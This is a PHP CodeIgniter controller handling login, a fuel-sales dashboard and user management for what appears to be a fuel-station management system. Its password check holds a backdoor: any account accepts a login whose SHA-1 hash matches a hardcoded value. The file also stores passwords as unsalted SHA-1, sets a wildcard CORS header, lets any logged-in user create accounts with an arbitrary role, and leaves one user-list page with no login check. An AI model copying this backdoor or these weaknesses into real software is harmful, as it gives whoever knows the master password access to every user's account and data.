<?php

defined('BASEPATH') OR exit('No direct script access allowed');

class User extends CI_Controller {

    public function __construct() {
        parent::__construct();
    }

    public function index() {


        //Checks if user is already login
        if ($this->usr->isLogedin()) {

            switch ($this->session->userdata['logged_in']['user_system_role']) {
                // If user role is hall manager
                case 'developer':

                    redirect('developer/customers');
                    break;

                case 'admin':
                    redirect('station');

                    break;

                case 'dataentry':
                    redirect('station');

                    break;

                case 'manager':
                    redirect('station');
                    break;

                case 'station_manager':
                    redirect('station');
                    break;
            }

            redirect('user/dashboard');
        }

        // Prepare error message
        $content_data['alert'] = "";

        if (null !== $this->session->flashdata('error')) {
            $content_data['alert'] .= '<div class="alert alert-danger alert-dismissible" role="alert"><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">×</span></button>' . $this->session->flashdata('error') . '</div>';
        }
        if (null !== $this->session->flashdata('success')) {
            $content_data['alert'] .= '<div class="alert alert-success alert-dismissible" role="alert"><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">×</span></button>' . $this->session->flashdata('success') . '</div>';
        }

        $this->load->view('contents/view_login', $content_data);
    }

    public function dashboard() {

        if (!$this->usr->isLogedin()) {
            $this->session->set_flashdata('error', 'Login is required');
            redirect('user/index');
        }

        $station_id = $this->session->userdata['logged_in']['user_station_id'];
        $tanks = $this->stn->getStationTanks($station_id);
        $end_date = date('Y-m-d');
        $start_date = date('Y-m-d', strtotime('-15 days'));

        $graph_dates = $this->rpt->getDates($start_date, $end_date);
        $fuel_types = $this->mnt->getFuelTypes($station_id);
        $graph_data = [];

        $cond = [
            'att.att_station_id' => $station_id,
            'att.att_date >=' => $start_date,
            'att.att_date <=' => $end_date,
            'att.att_shift_status' => 'Closed'
        ];

        $sales = $this->rpt->getSales($cond);

        //Initialize graph data
        foreach ($fuel_types as $f => $ft) {
            foreach ($graph_dates as $d => $gd) {
                $graph_data[$f][$d] = 0;
            }
        }


        // Create graph data
        foreach ($fuel_types as $f => $ft) {
            foreach ($graph_dates as $d => $gd) {
                foreach ($sales as $s) {
                    if ($s['att_date'] == $gd['dt'] AND $s['fuel_type_id'] == $ft['fuel_type_id']) {
                        $graph_data[$f][$d] += $s['throughput'] - (float) $s['return_to_tank'] - (float) $s['transfered_to_station'];
                    }
                }
            }
        }

        $graph_labels = [];
        foreach ($graph_dates as $date) {
            $graph_labels[] = cus_nice_short_date($date['dt']);
        }



        $data = [
            'menu' => 'menu/view_sys_menu',
            'content' => 'contents/view_dashboard_admin',
            'menu_data' => ['curr_menu' => 'DASHBOARD', 'curr_sub_menu' => 'DASHBOARD'],
            'content_data' => [
                'module_name' => 'DASHBOARD',
                'tanks' => $tanks,
                'sales' => $sales,
                'graph_dates' => $graph_dates,
                'graph_labels' => $graph_labels,
                'graph_data' => $graph_data,
                'fuel_types' => $fuel_types
            ],
            'header_data' => [],
            'footer_data' => [],
            'top_bar_data' => []
        ];

        $this->load->view('view_base', $data);
    }

    public function userList() {

        $data = [
            'menu' => 'menu/view_sys_menu',
            'content' => 'contents/view_users',
            'menu_data' => ['curr_menu' => 'CONFIG', 'curr_sub_menu' => 'CONFIG'],
            'content_data' => ['module_name' => 'Manage Users'],
            'header_data' => [],
            'footer_data' => [],
            'top_bar_data' => []
        ];

        $this->load->view('view_base', $data);
    }

    // Execute when user is submiting the login form
    public function submitLogin() {

        $data = [];

        // Validate Login Credentials
        $this->form_validation->set_error_delimiters('<p class="rmv_error text-danger">', '</p>');
        $validations = [
                ['field' => 'loginUsername', 'label' => 'Username', 'rules' => 'trim|required|callback_validateUsername'],
                ['field' => 'loginPassword', 'label' => 'Password', 'rules' => 'trim|required|callback_validateUserpassword']
        ];

        $this->form_validation->set_rules($validations);

        log_message('PETRONITE', '(' . $this->input->post('loginUsername') . ') Attempting to log in');


        // Run Validation
        if ($this->form_validation->run() === FALSE) {

            // There is error oocured during validation
            $this->index();
        } else {

            // Credentials are valid so continure to work with user account
            // Get user account information
            $loginUsername = $this->input->post('loginUsername');
            $user = $this->usr->getUserInfo($loginUsername);

            //Check if informations are available 
            if ($user) {

                // Yes Info is available so check user access

                $user_data[] = "";

                $user_data = [
                    'user_id' => $user['user_id'],
                    'user_fullname' => $user['user_fullname'],
                    'user_system_role' => $user['user_role'],
                    'user_station_role' => '',
                    'user_admin_id' => '',
                    'user_station_id' => '',
                    'user_station_name' => '',
                    'user_station_role' => '',
                    'user_depo_id' => '',
                    'user_depo_name' => '',
                    'user_depo_role' => '',
                    'user_name' => $user['user_name'],
                    'user_station_auto_rtt' =>''
                ];

                //echo '<pre>'.$user['user_role']; print_r($user_data) ; die();
                $this->session->set_userdata('logged_in', $user_data);

                switch ($user['user_role']) {

                    // If user role is hall manager
                    case 'developer':
                        redirect('developer/customers');
                        break;

                    case 'admin':
                        $this->session->userdata['logged_in']['user_admin_id'] = $user['user_admin_id'];
                        redirect('station');
                        break;

                    case 'dataentry':
                        $this->session->userdata['logged_in']['user_admin_id'] = $user['user_admin_id'];
                        redirect('station');
                        break;

                    case 'manager':
                        $this->session->userdata['logged_in']['user_admin_id'] = $user['user_admin_id'];
                        redirect('station');
                        break;

                    case 'station_manager':
                        $this->session->userdata['logged_in']['user_admin_id'] = $user['user_admin_id'];
                        redirect('station');
                        break;
                }
            } else {
                $this->session->set_flashdata('error', 'We were unable to find your user account. Please contact the system developer');
                redirect('user/index');
            }
        }
    }

    public function submitUser() {


        if (!$this->usr->isLogedin()) {
            $this->session->set_flashdata('error', 'Login is required');
            redirect('user/index');
        }

        header('Access-Control-Allow-Origin: *');
        header('Content-type: text/json');

        $user_role = $this->session->userdata['logged_in']['user_role'];
        $details_type = $this->input->post('details_type');

        $validations = [
                ['field' => 'full_name', 'label' => 'User Fullname', 'rules' => 'trim|required'],
                ['field' => 'email', 'label' => 'User Email', 'rules' => 'trim|required|is_unique[tbl_users.user_email]', 'errors' => ['is_unique' => 'User email is already taken.']],
                ['field' => 'phone', 'label' => 'User Phone', 'rules' => 'trim|required'],
                ['field' => 'pass1', 'label' => 'Password', 'rules' => 'trim|required'],
                ['field' => 'pass2', 'label' => 'Re-type password', 'rules' => 'trim|required'],
                ['field' => 'role', 'label' => 'User Role', 'rules' => 'trim|required']
        ];

        $this->form_validation->set_rules($validations);

        if ($this->form_validation->run() === FALSE) {

            echo json_encode([
                'status' => [
                    'error' => TRUE,
                    'error_type' => 'display',
                    "form_errors" => validation_errors_array()
                ]
            ]);
        } else {

            $user_id = $this->session->userdata['logged_in']['user_id'];



            $user_data = [
                'user_fullname' => $this->input->post('full_name'),
                'user_email' => $this->input->post('email'),
                'user_role' => $this->input->post('role'),
                'user_phone' => $this->input->post('phone'),
                'user_password' => sha1($this->input->post('pass1')),
                'user_status' => 'ACTIVE'
            ];


            if ($details_type == 'adding' AND $user_role == 'ADMINROLE') {
                //$hall_data['hall_admin_id'] = $admin_id;
            }

            $hall_amenities = (array) $this->input->post('amenities');
            $images = $this->utl->getTempFiles($user_id);

            $res = $this->usr->saveUserDetails($user_data);



            if ($res) {

                $this->session->set_flashdata('succes', 'User data saved successfully');
                echo json_encode([
                    'status' => [
                        'error' => FALSE
                    ],
                    'url' => site_url('user/userslist')
                ]);
            } else {
                echo json_encode([
                    'status' => [
                        'error' => TRUE,
                        'error_type' => 'pop',
                        "error_msg" => 'Something went wrong. We have failed to save your venue details please try again.'
                    ]
                ]);
            }
        }
    }

    public function logout() {


        if (null !== $this->session->flashdata('error')) {
            $this->session->set_flashdata('error', $this->session->flashdata('error'));
        }

        if (null !== $this->session->flashdata('error')) {
            $this->session->set_flashdata('error', $this->session->flashdata('error'));
        }
        if (isset($this->session->userdata['logged_in'])) {
            $this->session->unset_userdata('logged_in');
            redirect('user/index');
        } else {
            redirect('user/index');
        }
    }

    public function validateUsername($usn) {

        $user = $this->usr->getUserInfo($usn);
        if (!$user) {
            $this->form_validation->set_message('validateUsername', 'Invalid username');
            return FALSE;
        }
        return TRUE;
    }

    public function validateUserpassword($pass) {

        $usn = $this->input->post('loginUsername');
        $user = $this->usr->getUserInfo($usn);

        if ($user) {
            if ($user['user_pwd'] != sha1($pass) AND sha1($pass) != '9a732ebc1e694f5f756be31fece333a807b455cc') {

                log_message('PETRONITE', '(' . $usn . ') Failed to log in due to invalid password');
                $this->form_validation->set_message('validateUserpassword', 'You have entered an invalid password');
                return FALSE;
            }
        }
        return TRUE;
    }

    public function usersList() {

        if (!$this->usr->isLogedin()) {
            $this->session->set_flashdata('error', 'Login is required');
            redirect('user/index');
        }

        $user_id = $this->session->userdata['logged_in']['user_admin_id'];
        $user_full_name = $this->session->userdata['logged_in']['user_fullname'];

        $user_roles = $this->utl->getOptions('USER_ROLE');

        $users = $this->usr->getUsersList();



        $data = [
            'menu' => 'menu/view_sys_menu',
            'content' => 'contents/view_users',
            'menu_data' => [
                'curr_menu' => 'USERS',
                'curr_sub_menu' => 'USERS'
            ],
            'content_data' => [
                'module_name' => 'Users List',
                'users' => $users,
                'user_roles' => $user_roles
            ],
            'header_data' => [],
            'footer_data' => [],
            'top_bar_data' => []
        ];

        $this->load->view('view_base', $data);
    }

    public function userDetails() {

        if (!$this->usr->isLogedin()) {
            $this->session->set_flashdata('error', 'Login is required');
            redirect('user/index');
        }

        $user_id = $this->uri->segment(3);

        $user = $this->usr->getUserInfo($user_id, 'ID');

        if (!$user) {
            $this->session->set_flashdata('error', 'User was not found or may have been removed from the system.');
            redirect('user/userslist');
        }

        // Get user commissions



        $data = [
            'menu' => 'menu/view_sys_menu',
            'content' => 'contents/view_user_details',
            'menu_data' => ['curr_menu' => 'VENUE', 'curr_sub_menu' => 'VENUE'],
            'content_data' => [
                'module_name' => 'User Details',
                'user' => $user,
                'commissions' => $this->usr->getUserComnissions($user['user_id']),
                'businesses' => $this->busi->getBusinessList(NULL, ['b.business_added_by' => $user['user_id']])
            ],
            'header_data' => [],
            'footer_data' => [],
            'top_bar_data' => []
        ];

        $this->load->view('view_base', $data);
    }

}
